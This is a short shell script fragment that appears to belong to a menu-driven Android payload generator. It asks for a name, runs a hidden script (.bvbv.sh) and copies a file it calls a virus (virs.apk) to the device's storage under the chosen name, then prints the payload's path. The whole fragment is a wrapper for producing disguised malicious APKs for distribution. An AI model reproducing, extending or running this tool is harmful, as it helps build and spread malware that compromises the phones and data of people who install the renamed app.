echo -e " $blue"
echo "                            [0]back"
read -p "  name -------> " vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cd $HOME/payload5
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload5/.viros/virs.apk /sdcard/payload5/$vv.apk
echo -e "$green               end the vairos----->($vv.apk)"
echo ""
echo "      Path of the pyload----->  sdcard/payload5/$vv.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh
